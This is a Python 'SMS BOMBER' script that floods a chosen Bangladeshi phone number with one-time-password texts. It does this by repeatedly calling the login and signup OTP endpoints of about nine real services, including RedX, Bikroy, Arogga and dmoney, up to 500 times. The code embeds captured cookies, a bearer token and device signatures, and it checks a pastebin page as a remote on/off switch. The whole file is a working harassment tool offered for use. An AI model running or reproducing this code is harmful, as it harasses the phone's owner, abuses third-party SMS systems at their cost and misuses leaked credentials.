# Codded By Ariful Islam Arman (ARU)
# writen With python
import os, time, json, sys, random, string, webbrowser

import requests

# color
# Color Value
blueVal = "94m"
redVal = "91m"
greenVal = "32m"
whiteVal = "97m"
yellowVal = "93m"
cyanVal = "96m"
# normal
normal = "\33["
# Bold
bold = "\033[1;"
# italic
italic = "\x1B[3m"
# Color Normal
blue = normal + blueVal  # Blue Color Normal
red = normal + redVal  # Red Color Normal
green = normal + greenVal  # Green Color Normal
white = normal + whiteVal  # white Color Normal
yellow = normal + yellowVal  # yellow Color Normal
cyan = normal + cyanVal  # Cyan Color Normal
# Color Bold
blueBold = bold + blueVal  # Blue Color Bold
redBold = bold + redVal  # Red Color Bold
greenBold = bold + greenVal  # Green Color Bold
whiteBold = bold + whiteVal  # white Color Bold
yellowBold = bold + yellowVal  # yellow Color Bold
cyanBold = bold + cyanVal  # Cyan Color Bold
# oparetor
robi = "018"
airtel = "016"
grameenohone = "017"
grameenohone_miror = "013"
banglalink = "019"
banglalink_miror = "019"
teletalk = "015"
global oparetor
global number, country_valid, amount
# color end
end = '\033[0m'
colorArr = ["\033[1;91m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]


# Char Print
def printchar(w, t):  # w=word and t =time
    for word in w + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(t)


# Import All Module
try:
    import requests
except:
    printchar(cyanBold + "installing requests.....", 0.05)
    time.sleep(2)
    os.system("pip install requests")
    import requests

    printchar(greenBold + "requests successfully installed.....", 0.05)
    time.sleep(2)
    os.system('cls')


def banner():
    a = random.choice(colorArr)
    r = random.choice(colorArr)
    u = random.choice(colorArr)
    logo = f'''


{a}	 █████╗   {r}  ██████╗  {u}   ██╗   ██╗
{a}	██╔══██╗  {r}  ██╔══██╗ {u}   ██║   ██║
{a}	███████║  {r}  ██████╔╝ {u}   ██║   ██║
{a}	██╔══██║  {r}  ██╔══██╗ {u}   ██║   ██║
{a}	██║  ██║  {r}  ██║  ██║ {u}   ╚██████╔╝
{a}	╚═╝  ╚═╝  {r}  ╚═╝  ╚═╝ {u}    ╚═════╝ 
	'''
    infoC = random.choice(colorArr)
    toolsInfo = f'''{infoC}
    ╔════════════════════════════════════╗
    ║             {random.choice(colorArr)}SMS BOMBER {infoC}            ║
    ║     {random.choice(colorArr)}AUTHOR: ARIFUL ISLAM ARMAN {infoC}    ║
    ║           {random.choice(colorArr)}VERSION : 1.1.1  {infoC}        ║
    ╚════════════════════════════════════╝
    '''
    print(logo)
    print(toolsInfo)


def option():
    option = f'''{random.choice(colorArr)}
    [1] SMS BOMBING
    [2] CALL BOMBING [Coming Soon]
    [3] MORE TOOLS
    [4] CONNECT US
    ''' + end
    print(option)


def sent_pin(number, amount):
    phone = "+88" + number
    getIPjson = requests.get("http://ip-api.com/json/")
    ip = getIPjson.json()['query']
    infoC = random.choice(colorArr)
    bombInfo = f'''{infoC}
    ══════════════════════════════════════
         {random.choice(colorArr)}  PHONE : {random.choice(colorArr)}{phone}       
      {random.choice(colorArr)}      BOMBING AMOUNT : {random.choice(colorArr)}{amount}        
      {random.choice(colorArr)}     YOUR IP : {random.choice(colorArr)}{ip}
   {infoC} ══════════════════════════════════════
    '''
    os.system('cls')
    banner()
    print(bombInfo)
    i = 0
    print(f"{greenBold}   TOTAL SMS REQUESTS SENT: {cyanBold}", end="")
    while i < amount:
        number_without_zero = number[1:11]
        # REQUESTS
        # NESCO
        try:
            url_nesco = "http://nesco.sslwireless.com/api/v1/login"
            headers_nesco = {"Content-Type": "application/x-www-form-urlencoded"}
            data_nesco = "phone_number=" + number
            requ_nesco_server = requests.post(url_nesco, headers=headers_nesco, data=data_nesco)
            if requ_nesco_server.json()["message"] == "OTP has been Sent.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # MOKAM
        try:
            url_mokam = "https://ucapi.vnksrvc.com/users/send_user_otp.json"
            headers_mokam = {"Content-Type": "application/json"}

            data_mokam = '{"direct_login": true,"user": {"resend": false,"login": "88' + number + '","type": {"register": true}}}'

            requ_mokam_server = requests.post(url_mokam, headers=headers_mokam, data=data_mokam)
            if requ_mokam_server.json()["message"] == f"An OTP has been sent to 88{number}.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # RED X
        try:
            url_redX = "https://api.redx.com.bd/v1/user/signup"
            headers_redX = {
                "Cookie": "_fbp=fb.2.1665770836920.1536218668; _ga=GA1.3.2006512700.1665770837; _gid=GA1.3.1994739738.1665770837; _gat_gtag_UA_159382318_1=1; _hjSessionUser_2064965=eyJpZCI6ImY3ODFmMjQ1LWRmN2MtNWNhNy04NmRlLWYzZWE4MTk5N2NmMCIsImNyZWF0ZWQiOjE2NjU3NzA4MzcyOTYsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMwZDMyNWEzLTJhMGQtNGIyMi1iMmQxLWUzMzU1ODc0YTUzYyIsImNyZWF0ZWQiOjE2NjU3NzA4Mzc0MDEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0",
                "Content-Length": "67",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "Sec-Ch-Ua-Mobile": "?0",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36",
                "Origin": "https://redx.com.bd",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://redx.com.bd/"}
            data_redX = '{"name":"' + number + '","phoneNumber":"' + number + '","service":"redx"}'
            requ_redX_server = requests.post(url_redX, headers=headers_redX, data=data_redX)
            if requ_redX_server.json()["body"]["message"] == f"A verification code has been sent to {number}":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # Binge
        try:
            url_binge = "https://ss.binge.buzz/api/v3/otp/send/login"
            headers_binge = {"Host": "ss.binge.buzz",
                             "App-Name": "buzz.binge.mobile",
                             "App-Agent": "ANDROID",
                             "App-Version": "65",
                             "Accept": "application/json",
                             "Device-Type": "mob",
                             "Content-Type": "application/x-www-form-urlencoded",
                             "Content-Length": "17",
                             "Accept-Encoding": "gzip, deflate",
                             "User-Agent": "okhttp/4.3.1",
                             "Connection": "close"}
            data_binge = "phone=" + number
            requ_binge_server = requests.post(url_binge, headers=headers_binge, data=data_binge)
            if requ_binge_server.json()["message"] == "OTP sent Successfully":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # Bikroy
        try:
            url_bikroy = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" + number
            requ_bikroy_server = requests.get(url_bikroy)
            if requ_bikroy_server.json()["otp_length"] == 6:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # WEB ONE
        try:
            url_web_one = "http://27.131.15.19/lstyle/api/lsotprequest"
            headers_web_one = {"Content-Type": "application/json"}
            data_web_one = '{"shortcode":"2494905","msisdn":"88' + number + '"}'

            requ_web_one_server = requests.post(url_web_one, headers=headers_web_one, data=data_web_one)
            if requ_web_one_server.json()["reponse"] == "SUCCESSFUL":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # # Two
        try:
            url_web_two = "http://27.131.15.19:80/lstyle/api/lsotprequest"
            headers_web_two = {"Content-Type": "application/json"}
            data_web_two = '{"shortcode":"2494905","msisdn":"88' + number + '"}'
            requ_web_two_server = requests.post(url_web_two, headers=headers_web_two, data=data_web_two)
            if requ_web_two_server.json()["reponse"] == "SUCCESSFUL":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        try:
            url_arogga = "https://api.arogga.com/v1/auth/sms/send?f=app&v=4.4.3&os=android&osv=25"
            headers_arogga = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "208",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "okhttp/4.9."}
            data_arogga = "mobile=%2B88" + number + "&fcmToken=dfixXPTmTeSRBAFf-utxA-%253AAPA91bG1chvzjost2jd7UNgNeQFJ3s-0ynvXZs4Mat3RuXF0xz4c1yMMn83TL-pwVmAP7NIG45l4M-uJ0JK3n9r5kiDmMI_M6_wkN37O8arFojbXXljcRfj9YgY0jX-SJuumo36V5m8s&referral="
            requ_arogga_server = requests.post(url_arogga, headers=headers_arogga, data=data_arogga)
            if requ_arogga_server.json()["status"] == "success":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        try:
            url_drive = "https://www.mydrivebd.com/sapi/profile?action=signup&notify=true&rid=0.14346360928321888"

            headers_drive = {"Host": "www.mydrivebd.com",
                             "content-length": "126",

                             "x-deviceid": "web-08474b7fff1202e709e8935c10cf5ca3",
                             "content-type": "application/json;charset=UTF-8",

                             "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo Y85) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",

                             "accept": "*/*",
                             "origin": "https://www.mydrivebd.com",
                             "sec-fetch-site": "same-origin",
                             "sec-fetch-mode": "cors",
                             "sec-fetch-dest": "empty",
                             "referer": "https://www.mydrivebd.com/",
                             "accept-encoding": "gzip, deflate, br",
                             "accept-language": "en-US,en;q=0.9",
                             "cookie": "JSESSIONID=0E317BDBE17C4F72F27F47F3047D50FE.1i164",
                             "cookie": "loginRetriesLeft=5",
                             "cookie": "loginRetriesLeft_Date=%3B%20expires%3DTue%2C%2027%20Sep%202022%2021%3A39%3A57%20GMT",
                             "cookie": "cookiesAccepted=true",

                             "cookie": "_ga_G32R4HEST2=GS1.1.1664228417.1.0.1664228417.0.0.0",
                             "cookie": "_ga=GA1.1.1935620814.1664228418"}

            data_drive = '{"data":{"user":{"generic":{"userid":"88' + number + '","password":"' + ''.join(
                random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in
                range(15)) + '","l10n":"en","acceptedtermsandconditions":true}}}}'
            requ_drive_server = requests.post(url_drive, headers=headers_drive, data=data_drive)
            if requ_drive_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        try:
            url_lanka = "https://napi.dmoney.com.bd:6066/DmoneyPlatform/um_public_ekyc_checkMobileEmail"
            headers_anka = {"productCode": "FS",
                            "Authorization": "bearer 9gp0IvDK_5DX1StqaF4__rHnboeHCwayrMsdZ3aNGhoF1jykX7xyoQBASWnSTbnZ5NmMXDinOBhI4rjy-0mXcoPUsFu7Xbdga-sy3TunDsxToMzLqn-zB_3Opi7FbHOLU47kQFLzkPdF8_QADX9eC3Sy-j9IBH5JnoSvL4YADKZic6D_Ok8j7zwfWy3kcXKRgyFje5ft0s-5ztXWGUy-6YOGdbThWoy6LBbK_Yr3Ek8YYGi6",
                            "accept-language": "en", "Content-Type": "application/json",
                            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H)",
                            "Host": "napi.dmoney.com.bd:6066", "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
                            "Content-Length": "493"}
            data_lanka = '{"ekycApplicationData":{"emailId":"mr_kille@yahoo.com","id":0,"mobileNumber":"' + number + '","productCode":"FS"},"channel":"ANDROID_APP","deviceName":"Asus ASUS_Z01QD Android 7.1.2","deviceNumber":"751405a75d71e619","hardwareSignature":"14879d1fcce97c13dd673ee7ce6d7f1c69f56f8880c2d2326f675473472c1dcefb603902376020fc0a75d8a3868a84ebb5c1211abe38c75583d412783bbfcb40","mobileAppVersion":"4.1.1_RELEASE","mobileAppVersionCode":37,"productCode":"FS","requestId":"2015BDC18305FBFB","sessionToken":""}'
            requ_lanka_server = requests.post(url_lanka, headers=headers_anka, data=data_lanka)
            if requ_lanka_server.json()['status'] == 200 and requ_lanka_server.json()['errors'] == None:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        webbrowser.open('https://www.facebook.com/Aru.Ofc/')


def attack():
    def inValid():
        global number, country_valid, amount
        number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
        amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT [MAX 500]: {random.choice(colorArr)}"))
        country_valid = number[:3]

    inValid()

    if number == "":
        printchar(f"{red}    EMPTY INPUT", 0.05)
        time.sleep(2)
        os.system("cls")
        banner()
        attack()
    if amount == "":
        printchar(f"{red}    EMPTY INPUT", 0.05)
        time.sleep(2)
        os.system("cls")
        banner()
        attack()
    elif len(number) != 11:
        printchar(f"{red}    WRONG NUMBER", 0.05)
        time.sleep(2)
        os.system("cls")
        banner()
        attack()
    else:
        if country_valid == robi:
            operator = "Robi"
        elif country_valid == airtel:
            operator = "airtel"
        elif country_valid == teletalk:
            operator = "TaleTalk"
        elif country_valid == grameenohone:
            operator = "GrameenPhone"
        elif country_valid == grameenohone_miror:
            operator = "GrameenPhone"
        elif country_valid == banglalink:
            operator = "Banglalink"
        elif country_valid == banglalink_miror:
            operator = "Banglalink"
        else:
            printchar(f"{red}    INVALID OPERATOR", 0.05)
            time.sleep(2)
            os.system("cls")
            banner()
            attack()
        if amount <= 500:
            sent_pin(number, amount)


def main():
    ck_act = requests.get("https://pastebin.com/raw/EcVixLaC", verify=False).text
    os.system("cls")
    if ck_act == "active":
        pass
    else:
        printchar(f'{redBold}  Tools Deactived', 0.005)
        sys.exit()
    banner()
    option()
    input_options = str(input(f"  {random.choice(colorArr)}  CHOOSE A OPTION: {random.choice(colorArr)}"))
    if input_options == "1":
        os.system("cls")
        banner()
        attack()
    elif input_options == "2":
        os.system("cls")
        banner()
        printchar(f"{yellowBold}   COMMING SOON...", 0.01)
    elif input_options == "3":
        webbrowser.open('https://github.com/Aru-Ofc-git/')
    elif input_options == "4":
        os.system("cls")
        banner()
        connectOptions = f'''{random.choice(colorArr)}
    [1] GitHub
    [2] Facebook
    [3] Chat with admin
    [4] Instagram
    [5] YouTube    
        '''
        printchar(connectOptions, 0.005)
        inputConnectOption = str(input(f"  {random.choice(colorArr)}  CHOOSE A OPTION: {random.choice(colorArr)}"))

        if inputConnectOption == "1":
            webbrowser.open('https://github.com/Aru-Ofc-git/')
            time.sleep(5)
            main()
        elif inputConnectOption == "2":
            webbrowser.open('https://www.facebook.com/Aru.Ofc/')
            time.sleep(5)
            main()
        elif inputConnectOption == "3":
            webbrowser.open('https://m.me/1R13A14')

            time.sleep(5)
            main()
        elif inputConnectOption == "4":
            webbrowser.open('https://www.instagram.com/aru.ofc.ins/')
            time.sleep(5)
            main()
        elif inputConnectOption == "5":
            webbrowser.open('https://youtube.com/c/ARULyrics1')
            time.sleep(5)
            main()
        else:
            printchar(redBold + "\n    Invalid input", 0.01)
            time.sleep(4)
            main()

    else:
        main()